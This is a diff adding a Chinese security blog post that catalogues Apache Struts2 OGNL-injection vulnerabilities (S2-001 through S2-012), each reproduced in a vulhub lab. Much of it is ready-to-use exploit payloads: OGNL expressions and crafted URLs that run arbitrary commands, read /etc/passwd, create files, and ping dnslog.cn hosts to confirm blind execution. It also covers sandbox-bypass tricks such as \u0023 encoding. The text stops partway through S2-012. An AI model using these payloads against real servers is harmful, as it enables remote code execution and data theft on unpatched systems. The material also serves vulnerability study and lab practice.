@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Struts2漏洞集合 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Structs2漏洞集合"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Struts2漏洞集合
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" class="article-date">
+  <time datetime="2022-03-05T01:56:28.000Z" itemprop="datePublished">2022-03-05</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/Apache/">Apache</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">7.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">40 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Struts2漏洞集合"><a href="#Struts2漏洞集合" class="headerlink" title="Struts2漏洞集合"></a>Struts2漏洞集合</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Struts 2最初被称为WebWork 2，它是一个简洁的、可扩展的框架，可用于创建企业级Java web应用程序。设计这个框架是为了从构建、部署、到应用程序维护方面来简化整个开发周期。</p>
+<p>[TOC]</p>
+<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><p>这里总结下关于Struct2的漏洞集合，靶场环境使用vulhub进行搭建。</p>
+<h3 id="S2-001-CVE-2007-4556"><a href="#S2-001-CVE-2007-4556" class="headerlink" title="S2-001(CVE-2007-4556)"></a>S2-001(CVE-2007-4556)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Struts 2.0.0 – Struts 2.0.8</p>
+<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在登录框中按照%{xxxx}的格式输入测试的表达式</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145120534.png" class title="image-20220309145120534">
+
+<p>点击提交后，表达式执行成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145221296.png" class title="image-20220309145221296">
+
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取tomcat执行路径</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取web路径</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145842935.png" class title="image-20220309145842935">
+
+
+
+<p><strong>任意命令执行</strong></p>
+<p>其他命令可直接修改new java.lang.String<a href="xxx"></a>函数里面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行读取&#x2F;etc&#x2F;passwd文件命令</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309150137162.png" class title="image-20220309150137162">
+
+<h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p>
+<p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
+<ul>
+<li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li>
+<li>S2-003 后官方增加了安全模式（沙盒）</li>
+<li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li>
+</ul>
+<h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.1.8.1</p>
+<h4 id="漏洞探测-1"><a href="#漏洞探测-1" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
+<p>修改exec()中需执行的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22pwd%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><h4 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。<strong>也就是一般出现在表单处</strong></ActionName></p>
+<p>例如这里有一个 UserAction：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+
+<p>然后配置有 UserAction-validation.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">validators</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.2.3</p>
+<h4 id="漏洞探测-2"><a href="#漏洞探测-2" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153002375.png" class title="image-20220309153002375">
+
+<p>表达式执行成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153336735.png" class title="image-20220309153336735">
+
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
+<p>修改下面poc中exec()函数id参数执行其他命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令<code>id</code>，返回信息</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153524428.png" class title="image-20220309153524428">
+
+<p>返回当前用户root</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153722721.png" class title="image-20220309153722721">
+
+<h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><h4 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+<p>例如在 devMode 模式下直接添加参数<code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）</p>
+<h4 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1</p>
+<h4 id="漏洞探测-3"><a href="#漏洞探测-3" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22id%22%29)</span><br></pre></td></tr></table></figure>
+
+<p>可以观察到命令已经执行，只是没有回显</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309154647936.png" class title="image-20220309154647936">
+
+<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们需要执行个在Linux上观察到的现象，这里我们使用dnslog解析记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.mkzgrx.dnslog.cn%22%29)</span><br></pre></td></tr></table></figure>
+
+<p>在DNS平台上可观察到解析记录，证明命令执行成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309155007949.png" class title="image-20220309155007949">
+
+<h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><h4 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\u0023</code>或<code>\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线。但是，如果当前action中接受了某个参数<code>example</code>，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在<code>example</code>参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#</code>、<code>\</code>等特殊字符的防御。</p>
+<p>漏洞代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example5Action</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2111967621952300611L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码没有更简单了，其接受了name参数并调用setName将其赋值给私有属性<code>this.name</code>，正是符合我们的要求。然后去<code>WEB-INF/src/java/struts-ajax.xml</code>看一下URL路由：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;ajax&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;example5&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>name=example5</code>，所以访问<code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里，访问该URL</p>
+<h4 id="漏洞版本-3"><a href="#漏洞版本-3" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1.1</p>
+<h4 id="漏洞探测-4"><a href="#漏洞探测-4" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309160925270.png" class title="image-20220309160925270">
+
+
+
+<p>进入容器文件夹查看文件是否创建成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器名/容器id bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161718892.png" class title="image-20220309161718892">
+
+
+
+<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20test.w2ypax.dnslog.cn%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>
+
+<p>设置属性并提交</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161911262.png" class title="image-20220309161911262">
+
+<p>可在dnslog平台上观察到dns记录</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161956916.png" class title="image-20220309161956916">
+
+<h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><h4 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p>
+<h4 id="漏洞版本-4"><a href="#漏洞版本-4" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.13</p>
+<h4 id="漏洞探测-5"><a href="#漏洞探测-5" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>读取文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取文件成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162448665.png" class title="image-20220309162448665">
+
